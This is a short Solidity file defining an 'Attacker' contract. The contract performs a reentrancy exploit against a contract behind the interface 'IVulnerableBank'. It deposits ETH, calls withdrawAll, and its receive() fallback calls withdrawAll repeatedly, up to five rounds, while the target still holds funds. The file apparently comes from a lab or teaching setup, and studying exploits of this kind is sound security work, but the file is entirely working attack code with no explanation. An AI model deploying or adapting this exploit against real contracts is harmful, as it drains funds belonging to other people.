// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVulnerableBank {
    function deposit() external payable;
    function withdrawAll() external;
}

contract Attacker {
    IVulnerableBank public bank;
    uint256 public rounds;
    uint256 public maxRounds = 5;

    constructor(address bankAddress) {
        bank = IVulnerableBank(bankAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "need ETH");
        rounds = 0;

        bank.deposit{value: msg.value}();
        bank.withdrawAll();
    }

    receive() external payable {
        if (rounds < maxRounds && address(bank).balance > 0) {
            rounds++;
            bank.withdrawAll();
        }
    }
}
